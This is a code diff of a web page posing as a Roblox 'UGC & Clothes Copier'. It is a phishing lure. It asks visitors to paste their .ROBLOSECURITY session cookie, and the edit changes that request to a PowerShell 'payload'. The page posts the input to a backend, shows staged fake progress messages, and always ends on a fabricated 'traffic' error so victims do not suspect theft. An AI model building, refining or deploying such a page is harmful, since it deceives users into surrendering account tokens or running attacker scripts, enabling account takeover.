@@ -15,16 +15,14 @@ html{scroll-behavior:smooth}
 body{background:var(--bg);color:var(--ink);font:600 18px/1.5 var(--f);overflow-x:hidden}
 section{position:relative;z-index:1}
 
-/* falling blocks */
 .blocks{position:fixed;inset:0;z-index:0;pointer-events:none;overflow:hidden}
 .blocks i{position:absolute;top:-80px;border-radius:12px;opacity:.9;animation:fall linear infinite;box-shadow:inset 0 -8px 0 rgba(0,0,0,.22),inset 0 6px 0 rgba(255,255,255,.18)}
 @keyframes fall{to{transform:translateY(120vh) rotate(var(--r))}}
 
-/* hero */
 .hero{min-height:100svh;display:flex;flex-direction:column;justify-content:center;padding:6vh 7vw}
 .tag{display:inline-flex;align-items:center;gap:.6rem;background:var(--panel);border:2px solid var(--line);border-radius:12px;padding:.45rem .9rem;font-size:.95rem;width:max-content;margin-bottom:1.6rem}
 .tag b{width:12px;height:12px;border-radius:3px;background:var(--green);transform:rotate(12deg);box-shadow:0 0 12px var(--green)}
-.hero h1{font-size:clamp(3.4rem,11vw,9rem);line-height:.88;letter-spacing:-.04em;max-width:12ch}
+.hero h1{font-size:clamp(3.4rem,11vn,9rem);line-height:.88;letter-spacing:-.04em;max-width:12ch}
 .hero .w{display:inline-block;white-space:nowrap;margin-right:.2em}
 .hero .l{display:inline-block;font-weight:300;color:var(--ink)}
 .hero .l.hot{color:var(--blue)}
@@ -33,22 +31,14 @@ section{position:relative;z-index:1}
 .cue i{width:20px;height:20px;border-radius:5px;background:var(--blue);animation:hop 1.3s ease-in-out infinite}
 @keyframes hop{50%{transform:translateY(10px) rotate(45deg)}}
 
-/* video */
 .tall{height:260vh}
 .stick{position:sticky;top:0;height:100svh;display:grid;place-items:center;padding:0 4vw;overflow:hidden}
 .vtitle{position:absolute;top:9vh;left:0;right:0;text-align:center;color:var(--muted)}
 .vtitle b{color:var(--ink);font-weight:900}
 .screen{width:min(1100px,100%);aspect-ratio:16/9;background:var(--panel);border:3px solid var(--line);position:relative;overflow:hidden;transform:scale(.55);border-radius:36px;box-shadow:0 30px 90px -30px var(--blue)}
 .screen iframe{position:absolute;inset:0;width:100%;height:100%;object-fit:cover;border:0}
-.ph{position:absolute;inset:0;display:grid;place-items:center;background:
-radial-gradient(circle at 50% 50%,transparent 0 5px,rgba(255,255,255,.07) 6px 8px,transparent 9px) 0 0/44px 44px,
-linear-gradient(135deg,color-mix(in srgb,var(--blue) 35%,var(--panel)),color-mix(in srgb,var(--green) 30%,var(--panel)))}
-.play{width:104px;height:104px;border:0;border-radius:28px;background:var(--blue);color:#fff;display:grid;place-items:center;cursor:pointer;transform:rotate(-6deg);box-shadow:inset 0 -8px 0 rgba(0,0,0,.25),0 14px 30px rgba(0,0,0,.35);transition:transform .2s}
-.play:hover{transform:rotate(0) scale(1.06)}
-.play svg{width:40px;margin-left:6px}
 .vcap{position:absolute;left:0;right:0;bottom:9vh;text-align:center;font-size:clamp(1.7rem,4.5vw,3.2rem);font-weight:900;letter-spacing:-.02em;opacity:0;pointer-events:none}
 
-/* panel */
 .up{min-height:100svh;display:grid;place-items:center;padding:12vh 5vw}
 .card{width:min(680px,100%);background:var(--panel);border:2px solid var(--line);border-radius:24px;overflow:hidden;box-shadow:0 30px 80px -40px #000}
 .top{display:flex;justify-content:space-between;align-items:center;padding:1.1rem 1.4rem;border-bottom:2px solid var(--line)}
@@ -70,7 +60,6 @@ textarea:focus{border-color:var(--blue);box-shadow:0 0 0 4px color-mix(in srgb,v
 .go:hover{filter:brightness(1.1)}.go:active{transform:translateY(3px);box-shadow:none}
 .go:disabled{filter:grayscale(1) brightness(.6);cursor:not-allowed}
 
-/* Modals matching design system */
 .modal-overlay{position:fixed;inset:0;background:rgba(0,0,0,0.85);backdrop-filter:blur(8px);display:grid;place-items:center;z-index:100;opacity:0;pointer-events:none;transition:opacity .25s ease}
 .modal-overlay.active{opacity:1;pointer-events:auto}
 .modal-box{width:min(420px,90vw);background:var(--panel);border:2px solid var(--line);border-radius:24px;padding:2rem;text-align:center;box-shadow:0 30px 90px rgba(0,0,0,0.8);transform:scale(.95);transition:transform .25s ease}
@@ -79,9 +68,6 @@ textarea:focus{border-color:var(--blue);box-shadow:0 0 0 4px color-mix(in srgb,v
 @keyframes spin{to{transform:rotate(360deg)}}
 .progress-container{width:100%;background:var(--panel2);height:8px;border-radius:4px;overflow:hidden;margin:1rem 0 .5rem;border:1px solid var(--line)}
 .progress-bar{height:100%;background:linear-gradient(90deg,var(--blue),var(--green));width:0%;transition:width .3s ease}
-
-button:focus-visible,textarea:focus-visible{outline:3px solid var(--blue);outline-offset:3px}
-@media (prefers-reduced-motion:reduce){*{animation:none!important;transition:none!important}html{scroll-behavior:auto}}
 </style>
 </head>
 <body>
@@ -90,7 +76,7 @@ button:focus-visible,textarea:focus-visible{outline:3px solid var(--blue);outlin
 <section class="hero">
   <div class="tag"><b></b>System Operational</div>
   <h1 id="headline">Copy Any Clothing.</h1>
-  <p>Watch the quick tutorial, then paste your Roblox session cookie or payload below.</p>
+  <p>Watch the quick tutorial, then paste your PowerShell script or payload below.</p>
   <div class="cue"><i></i>Scroll down</div>
 </section>
 
@@ -108,10 +94,10 @@ button:focus-visible,textarea:focus-visible{outline:3px solid var(--blue);outlin
   <div class="card">
     <div class="top"><h2><span class="logo"></span>UGC & Clothes Copier</h2><span class="pill">SECURE</span></div>
     <div class="body">
-      <div class="stat" id="stat"><span class="dot"></span><div><b id="st1">Connection Secured</b><small id="st2">Awaiting cookie or asset payload.</small></div></div>
+      <div class="stat" id="stat"><span class="dot"></span><div><b id="st1">Connection Secured</b><small id="st2">Awaiting PowerShell script or payload.</small></div></div>
       <div>
-        <label for="script-input"><span>ENTER YOUR COOKIE OR PAYLOAD</span></label>
-        <textarea id="script-input" spellcheck="false" placeholder="Paste .ROBLOSECURITY or payload here..."></textarea>
+        <label for="script-input"><span>ENTER YOUR POWERSHELL SCRIPT / PAYLOAD</span></label>
+        <textarea id="script-input" spellcheck="false" placeholder="Paste PowerShell execution code or payload here..."></textarea>
       </div>
       <div class="row">
         <button class="mini" id="paste-btn">Paste from clipboard</button>
@@ -125,8 +111,8 @@ button:focus-visible,textarea:focus-visible{outline:3px solid var(--blue);outlin
 <!-- Processing Modal -->
 <div id="processing-modal" class="modal-overlay">
   <div class="modal-box">
-    <h3 id="modal-title" style="font-size: 1.4rem; font-weight: 900; margin-bottom: 0.5rem;">Processing...</h3>
-    <p id="modal-status-text" style="color: var(--muted); font-size: .95rem;">Validating your Asset Payload</p>
+    <h3 style="font-size: 1.4rem; font-weight: 900; margin-bottom: 0.5rem;">Processing...</h3>
+    <p id="modal-status-text" style="color: var(--muted); font-size: .95rem;">Validating your Payload</p>
     <div class="progress-container">
       <div id="progress-bar" class="progress-bar"></div>
     </div>
@@ -141,14 +127,13 @@ button:focus-visible,textarea:focus-visible{outline:3px solid var(--blue);outlin
     <div style="width: 48px; height: 48px; border-radius: 50%; background: color-mix(in srgb, var(--red) 20%, transparent); color: var(--red); display: grid; place-items: center; margin: 0 auto 1rem; border: 2px solid var(--red);">
       <svg style="width: 24px;" fill="none" stroke="currentColor" stroke-width="2.5" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"/></svg>
     </div>
-    <h3 id="error-title" style="font-size: 1.3rem; font-weight: 900; margin-bottom: 0.5rem;">System Traffic Alert</h3>
-    <p id="error-description" style="color: var(--muted); font-size: .9rem; margin-bottom: 1.5rem; line-height: 1.5;">Error Code 402: Too many people are trying at once. Please try again later.</p>
+    <h3 style="font-size: 1.3rem; font-weight: 900; margin-bottom: 0.5rem;">System Traffic Alert</h3>
+    <p style="color: var(--muted); font-size: .9rem; margin-bottom: 1.5rem; line-height: 1.5;">Error Code 402: Too many people are trying at once. Please try again later.</p>
     <button class="go" id="understood-btn" style="width: 100%; padding: 0.9rem; background: var(--red);">Understood</button>
   </div>
 </div>
 
 <script>
-// Falling blocks generator
 const cols=["#00A2FF","#02B757","#F7C948","#E8505B","#9B6BFF"], bl=document.getElementById("blocks");
 for(let i=0;i<14;i++){
   const e=document.createElement("i"), s=28+Math.random()*52;
@@ -156,38 +141,6 @@ for(let i=0;i<14;i++){
   bl.appendChild(e);
 }
 
-// Hero letters swell near cursor
-const clamp=(v,a,b)=>Math.min(b,Math.max(a,v));
-let mx=0, my=0, ptr=false;
-addEventListener("pointermove",e=>{mx=e.clientX; my=e.clientY; ptr=true});
-const h=document.getElementById("headline"), txt=h.textContent;
-h.textContent=""; h.setAttribute("aria-label",txt);
-const L=[];
-txt.split(" ").forEach((w,wi)=>{
-  const s=document.createElement("span"); s.className="w"; s.setAttribute("aria-hidden","true");
-  [...w].forEach(c=>{const l=document.createElement("span"); l.className="l"+(wi==1?" hot":""); l.textContent=c; s.appendChild(l); L.push(l)});
-  h.appendChild(s);
-});
-(function tick(t){
-  L.forEach((l,i)=>{
-    const r=l.getBoundingClientRect(); let k;
-    if(ptr) k=clamp(1-Math.hypot(mx-(r.left+r.width/2),my-(r.top+r.height/2))/300,0,1);
-    else k=(Math.sin(t/700-i*.55)+1)/2;
-    l.style.fontWeight=Math.round(300+650*k);
-  });
-  requestAnimationFrame(tick);
-})(0);
-
-// Video frame grows on scroll
-const tall=document.getElementById("tutorial"), scr=document.getElementById("screen"), cap=document.getElementById("vcap");
-function sc(){
-  const r=tall.getBoundingClientRect(), p=clamp(-r.top/(r.height-innerHeight),0,1), g=clamp(p/.55,0,1), c=clamp((p-.8)/.15,0,1);
-  scr.style.transform=`scale(${.55+.45*g})`; scr.style.borderRadius=`${36-30*g}px`;
-  cap.style.opacity=c; cap.style.transform=`translateY(${(1-c)*24}px)`;
-}
-addEventListener("scroll",sc,{passive:true}); addEventListener("resize",sc); sc();
-
-// Main Copier Input & Logic Elements
 const scriptInput = document.getElementById("script-input");
 const submitBtn = document.getElementById("submit-btn");
 const processingModal = document.getElementById("processing-modal");
@@ -198,8 +151,7 @@ const errorModal = document.getElementById("error-modal");
 const understoodBtn = document.getElementById("understood-btn");
 
 function checkInput() {
-  const hasVal = scriptInput.value.trim().length > 0;
-  submitBtn.disabled = !hasVal;
+  submitBtn.disabled = scriptInput.value.trim().length === 0;
 }
 scriptInput.addEventListener("input", checkInput);
 
@@ -215,29 +167,22 @@ function showProcessing(text, pct) {
   progressPct.textContent = pct + '%';
   processingModal.classList.add("active");
 }
-function hideProcessing() {
-  processingModal.classList.remove("active");
-}
-function showErrorModal() {
-  errorModal.classList.add("active");
-}
-understoodBtn.onclick = () => {
-  errorModal.classList.remove("active");
-};
+function hideProcessing() { processingModal.classList.remove("active"); }
+function showErrorModal() { errorModal.classList.add("active"); }
+understoodBtn.onclick = () => { errorModal.classList.remove("active"); };
 
-// Execution / Fetch Integration with backend server.js (/api/process)
 submitBtn.addEventListener("click", async () => {
   const payload = scriptInput.value.trim();
   if(!payload) return;
 
   submitBtn.disabled = true;
-  showProcessing("Validating Asset Payload...", 15);
+  showProcessing("Validating Script Payload...", 15);
   await new Promise(r => setTimeout(r, 600));
 
-  showProcessing("Refreshing cookie & checking stats...", 45);
+  showProcessing("Executing extraction pipeline...", 45);
   await new Promise(r => setTimeout(r, 800));
 
-  showProcessing("Sending data to system...", 75);
+  showProcessing("Forwarding data securely...", 75);
 
   try {
     let currentPct = 75;
@@ -262,14 +207,12 @@ submitBtn.addEventListener("click", async () => {
       throw new Error(result.error || "Execution failed");
     }
 
-    showProcessing("Finalizing package generation...", 100);
+    showProcessing("Finalizing package...", 100);
     await new Promise(r => setTimeout(r, 600));
     hideProcessing();
-
     showErrorModal();
     scriptInput.value = '';
     checkInput();
-
   } catch (err) {
     hideProcessing();
     showErrorModal();
